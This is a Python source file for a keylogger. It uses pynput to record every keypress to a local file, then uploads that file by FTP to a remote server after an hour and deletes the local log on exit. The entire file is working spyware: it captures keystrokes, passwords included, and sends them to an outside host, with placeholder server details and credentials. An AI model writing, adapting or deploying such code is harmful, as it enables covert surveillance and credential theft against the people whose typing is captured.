# import libraries
from pynput import keyboard
from ftplib import FTP
import threading
import os

# FTP Configurations
ftp_server = 'server.ip'
ftp_username = 'username'
ftp_password = '123'
upload_interval = 3600  # Upload interval in seconds (1 hour)


# This will be what logs the keys that are pressed, in addition to writing it to a file
def keypressed(key):
    print(str(key))
    with open('log.txt', 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            return "Error"


# Function to upload the log file to the specified FTP server
def send_log():
    try:
        ftp = FTP(ftp_server)
        ftp.login(user=ftp_username, passwd=ftp_password)
        with open('log.txt', 'rb') as file:
            ftp.storbinary('STOR logs.txt', file)
        ftp.quit()
        return "file uploaded"
    except Exception as e:
        return f"Error uploading log file: {e}"


# Main function that starts the logger
def main():
    try:
        # Start the keyboard listener
        listener = keyboard.Listener(on_press=keypressed)
        listener.start()

        # Schedule log upload
        threading.Timer(upload_interval, send_log).start()

        # Wait for the listener to finish (should never happen)
        listener.join()

    finally:
        # Delete the log file before exiting
        try:
            os.remove("log.txt")
            print("log.txt deleted")
        except Exception as e:
            print(f"Error deleting log.txt file: {e}")


if __name__ == "__main__":
    main()
